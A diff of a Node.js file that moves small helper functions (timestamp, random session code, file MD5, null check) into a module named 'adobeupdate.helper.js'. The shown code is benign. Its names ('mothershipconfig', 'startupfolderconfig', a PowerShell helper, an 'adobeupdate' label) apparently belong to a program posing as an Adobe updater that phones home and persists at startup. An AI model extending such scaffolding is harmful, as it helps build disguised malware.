@@ -7,60 +7,7 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
-function getRandomCode(n) {
-    const min = Math.pow(10, n - 1);
-    const max = Math.pow(10, n) - 1;
-
-    return crypto.randomInt(min, max + 1).toString();
-}
-
-function getTimestamp() {
-    const date = new Date();
-
-    // Extract components
-    const year = date.getFullYear();
-    const month = String(date.getMonth() + 1).padStart(2, "0"); //
-    const day = String(date.getDate()).padStart(2, "0"); //
-    const hours = String(date.getHours()).padStart(2, "0"); //
-    const minutes = String(date.getMinutes()).padStart(2, "0"); //
-    const seconds = String(date.getSeconds()).padStart(2, "0"); //
-    const ms = String(date.getMilliseconds()).padStart(3, "0"); //
-
-    // Combine into final strings
-    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
-    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
-
-    return fullWithMs;
-}
-
-function fileExists(filePath) {
-    try {
-        const stats = fs.statSync(filePath);
-        return stats.isFile();
-    } catch (error) {
-        return false;
-    }
-}
-
-function getFileMD5(fpath) {
-    if (!fileExists(fpath)) {
-        throw new Error("file does not exist [" + fpath + "]");
-    }
-
-    const fileBuffer = fs.readFileSync(fpath);
-
-    return crypto.createHash("md5").update(fileBuffer).digest("hex");
-}
-
-function isNullOrWhitespace(str) {
-    if (typeof str === "undefined" || str === null) {
-        return true;
-    }
-
-    if (!(typeof str === "string")) return true;
-
-    return !str || !str.trim();
-}
+const helper = require("./adobeupdate.helper.js");
 
 var mothershipconfig = {
     get mothershipconfigfpath() {
@@ -150,7 +97,7 @@ var systemconfig = {
             return true;
         }
 
-        if (fileExists(path.join(this.scriptdir, "tplmode"))) {
+        if (helper.fileExists(path.join(this.scriptdir, "tplmode"))) {
             return true;
         }
 
@@ -315,17 +262,18 @@ var systemconfig = {
         return path.basename(this.scriptfpath);
     },
 
-    scriptts: getTimestamp(),
+    scriptts: helper.getTimestamp(),
 
+    // TODO write script MD5 to file, read from file
     __scriptmd5: "",
     get scriptmd5() {
-        if (isNullOrWhitespace(this.__scriptmd5))
-            this.__scriptmd5 = getFileMD5(this.scriptfpath);
+        if (helper.isNullOrWhitespace(this.__scriptmd5))
+            this.__scriptmd5 = helper.getFileMD5(this.scriptfpath);
 
         return this.__scriptmd5;
     },
 
-    __sessionid: getRandomCode(8),
+    __sessionid: helper.getRandomCode(8),
 
     get sessionid() {
         return this.__sessionid;
@@ -528,5 +476,4 @@ module.exports = {
     startupfolderconfig,
 };
 
-const helper = require("./adobeupdate.helper.js");
 const helper_ps = require("./adobeupdate.helper.ps.js");
